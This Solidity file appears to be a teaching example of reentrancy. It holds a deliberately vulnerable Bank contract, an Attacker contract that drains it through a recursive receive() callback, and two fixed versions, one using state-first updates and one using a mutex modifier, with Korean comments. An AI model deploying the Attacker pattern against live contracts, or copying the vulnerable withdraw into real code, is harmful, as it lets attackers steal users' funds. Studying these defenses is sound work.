// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract Bank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint currentBalance = balances[msg.sender]; 
        (bool result,) = msg.sender.call{value:currentBalance}("");
        require(result, "failed to withdraw.");
        balances[msg.sender] = 0;     
    }
    
    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract Attacker {
    Bank public bank;
    address public owner;

    constructor(address _bank, address _owner) {
        bank = Bank(_bank);
        owner = _owner;
    }

    receive() payable external {
        if(address(msg.sender).balance>0) {
            bank.withdraw();
        }
    }

    function sendEther() external payable {
        bank.deposit{value:msg.value}();
    }

    function withdrawEther() external {
        bank.withdraw();
    }

    function checkBalance() external view returns(uint) {
        return address(this).balance;
    }
}
 
contract DefenseBank_1 {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint currentBalance = balances[msg.sender]; 

        // 출금을 실행하는 코드보다 먼저 상태변수를 변경시켜 재진입을 막는다.
        balances[msg.sender] = 0;

        (bool result,) = msg.sender.call{value:currentBalance}("");
        require(result, "failed to withdraw.");
    }
    
    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract DefenseBank_2 {
    mapping(address => uint) public balances;

    // modifier 설정으로 재진입을 막는다.
    bool public check_reentry;
    modifier check_reenterancy() {
        require(!check_reentry,"stop!");
        check_reentry = true;
        _;
        check_reentry = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external check_reenterancy{
        uint currentBalance = balances[msg.sender];
        (bool result,) = msg.sender.call{value:currentBalance}("");
        require(result, "failed to withdraw.");
        balances[msg.sender] = 0;
    }
    
    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }
}